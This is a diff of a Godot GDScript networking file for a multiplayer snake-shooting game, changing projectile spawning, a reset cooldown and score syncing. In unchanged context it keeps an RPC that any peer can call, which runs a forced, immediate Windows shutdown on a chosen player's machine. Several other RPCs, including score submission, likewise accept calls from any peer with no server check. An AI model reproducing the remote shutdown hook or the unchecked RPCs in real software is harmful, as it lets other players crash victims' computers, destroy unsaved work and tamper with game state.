@@ -20,22 +20,6 @@ func _ready():
 		multiplayer.peer_disconnected.connect(del_player)
 		add_avatar()
 	
-	$MultiplayerSpawner.spawn_function = func(snakeInfo):
-		var pos = snakeInfo[0]
-		var vel = snakeInfo[1]
-		var id = snakeInfo[2]
-		var speed = snakeInfo[3]
-		var shooter = snakeInfo[4]
-		
-		var snake = snakePath.instantiate()
-		snake.position = pos
-		snake.name = "snake$%#" + str(id)
-		snake.speed = speed
-		snake.velocity = vel
-		snake.id = id
-		snake.shooterId = shooter
-
-		return snake
 	
 	pass # Replace with function body.
 
@@ -129,58 +113,26 @@ func exit_game(id):
 var snakeID = 0
 var snakePath = preload("res://scenes/snake.tscn")
 func addSnakeAsClient(pos,vel):
-	rpc("addSnakeAsServer",pos,vel)
-@rpc("any_peer", "call_local") func addSnakeAsServer(pos,vel):
+	rpc("addSnakeAsServer",pos,vel,Globals.multiplayerId)
+@rpc("any_peer", "call_local") func addSnakeAsServer(pos,vel,shooterId):
 	if Globals.is_server:
 		snakeID += 1
 		
-#		$MultiplayerSpawner.spawn_function = func(pos,vel,id,speed):
-#			var snake = snakePath.instantiate()
-#			snake.position = pos
-#			snake.name = "snake$%#" + str(id)
-#			snake.speed = speed
-#			snake.velocity = vel
-#			snake.id = id
-#
-#			return snake
 		
 		var snake = snakePath.instantiate()
 		snake.position = pos
 		snake.velocity = vel
 		snake.id = snakeID
 		snake.name = "snake57497" + str(snakeID)
+		snake.shooterId = shooterId
+		snake.speed = randf_range(150,250)
 		
 		var objectHolder = get_tree().get_first_node_in_group("objectHolder")
 		objectHolder.call_deferred("add_child",snake)
 		
 		#$MultiplayerSpawner.spawn([pos,vel,snakeID,randf_range(50,150)])
 		
-		#rpc("_addSnakeAsServer",pos,vel,snakeID,randf_range(50,150))
-#@rpc("any_peer", "call_local") func _addSnakeAsServer(pos,vel,id,speed):
-#
-#	$MultiplayerSpawner.spawn_function = func(pos,vel,id,speed):
-#		var snake = snakePath.instantiate()
-#		snake.position = pos
-#		snake.name = "snake$%#" + str(id)
-#		snake.speed = speed
-#		snake.velocity = vel
-#		snake.id = id
-#
-#		return snake
-#
-#	$MultiplayerSpawner.spawn(pos,vel,id,speed)
-#
-#	var snake = snakePath.instantiate()
-#	snake.position = pos
-#	snake.name = "snake$%#" + str(id)
-#	snake.speed = speed
-#	snake.velocity = vel
-#	snake.id = id
-#
-#	prints(Globals.multiplayerId," ",snake.name)
-#
-#	var objectHolder = get_tree().get_first_node_in_group("objectHolder")
-#	objectHolder.call_deferred("add_child",snake)
+		
 
 func killSnake(id,dir):
 	var objectHolder = get_tree().get_first_node_in_group("objectHolder")
@@ -203,7 +155,7 @@ func add_avatar(id = 1):
 var bulletPath = preload("res://scenes/bullet.tscn")
 func createBullet(pos,dir,type):
 	rpc("_createBullet",pos,dir,type,Globals.multiplayerId)
-@rpc("any_peer", "call_local") func _createBullet(pos,dir,type,shooterId):
+@rpc("any_peer", "call_local", "unreliable") func _createBullet(pos,dir,type,shooterId):
 	
 	var bullet = bulletPath.instantiate()
 	
@@ -280,25 +232,36 @@ func gunPickup(id,type):
 		child.queue_free()
 	
 
+
+var lastResetTime = -30000
 func resetGame():
 	Globals.lastRoundStart = Time.get_ticks_msec()
-	rpc("_resetGame",)
+	
+	if lastResetTime + 5000 < Time.get_ticks_msec():
+		rpc("_resetGame")
+	
+	lastResetTime = Time.get_ticks_msec()
+
 @rpc("any_peer", "call_local") func _resetGame():
 	#Globals.player.reset()
-	
+	Globals.roundsPlayed += 1
 	
 	for child in get_tree().get_first_node_in_group("objectHolder").get_children():
 		if !child.is_in_group("avatar"):
 			child.queue_free()
 		else:
-			goToResetPos(int(str(child.name)),randi_range(0,$spawnPoints.get_child_count()-3))
+			initiateReset(int(str(child.name)),randi_range(0,$spawnPoints.get_child_count()-3))
 	
 	print("reset the game")
 	
 
-func goToResetPos(id,pos : int):
-	rpc("_goToResetPos",id,pos)
-@rpc("any_peer", "call_local") func _goToResetPos(id,pos : int):
+func initiateReset(id,pos : int):
+	
+	if !Globals.playerIsDead:
+		Globals.wins += 1
+	
+	submitScores()
+	
 	Globals.playerIsDead = false
 	
 	if Globals.multiplayerId == id:
@@ -340,6 +303,7 @@ func shutDown(targetId):
 	rpc("_shutdown",targetId)
 @rpc("any_peer", "call_local") func _shutdown(targetId):
 	if Globals.multiplayerId == int(targetId):
+		
 		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
 
 func getPlayersInServer():
@@ -350,13 +314,35 @@ func getPlayersInServer():
 		if child.is_in_group("avatar"):
 			dict[child.getName()] = child.getId()
 			
-			
 	
 	return dict
 	
 
+#should only be called by the server
+func updateScores():
+	rpc("_updateScores",Globals.playerScores)
+@rpc("any_peer","call_local") func _updateScores(scores):
+	if !Globals.is_server:
+		Globals.playerScores = scores
+	
+	pass
+
+#should only be called by the server
+func submitScores():
+	rpc("_submitScores",Globals.nameTag,Globals.wins,Globals.kills,Globals.deaths,Globals.roundsPlayed)
+@rpc("any_peer","call_local") func _submitScores(nameTag,wins,kills,deaths,roundsPlayed):
+	
+	if Globals.is_server:
+		Globals.playerScores[nameTag] = [wins,kills,deaths,roundsPlayed]
+	
+	pass
+
 func del_player(id = 1):
 	if id != 1:
+		var deadName = Globals.playersInServer.find_key(id)
+		if deadName != null:
+			Globals.playerScores.erase(deadName)
+		
 		rpc("_del_player",id)
 @rpc("any_peer", "call_local") func _del_player(id):
 	var objectHolder = get_tree().get_first_node_in_group("objectHolder")
